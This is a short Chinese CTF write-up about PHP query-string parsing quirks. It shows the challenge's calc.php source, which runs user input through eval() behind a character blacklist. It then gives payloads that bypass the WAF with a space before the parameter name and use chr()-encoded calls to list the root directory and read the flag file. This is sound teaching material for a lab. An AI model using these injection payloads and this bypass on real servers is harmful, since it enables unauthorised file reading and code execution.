# php字符串特性及waf绕过

## php字符串特性

php在查询字符串时，会有两个特性：
```
删除空白格

将某些字符转换为下划线
```

## waf的绕过
 
如果一个waf对一个变量的内容进行了审计，则如果想绕过waf，可以在变量名前面加空格，这样waf就不会将其作为
它要审计的变量名，但前提是waf不是php写的，题目是php写的


## scandir()函数

scandir()函数返回指定目录的文件和目录的数组

## var_dump()函数

var_dump()函数显示一个或多个表达式的结构信息，包括表达式的类型和数值



## 实例

通过查看页面源代码，我们可以知道它有一个waf和一个文件calc.php

我们通过构造/calc.php，得到源代码
```
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?> 
```
通过对源代码的审计，发现它对某些字符进行了过滤

因此，由于可以利用php字符串的特性，在num前面加空格绕过waf，并构造payload来查看flag位置
```
calc.php? num=var_dump(scandir(chr(47)));
```

可以看见里面有flagg文件，因此我们可以构造payload
```
calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

可以得到flag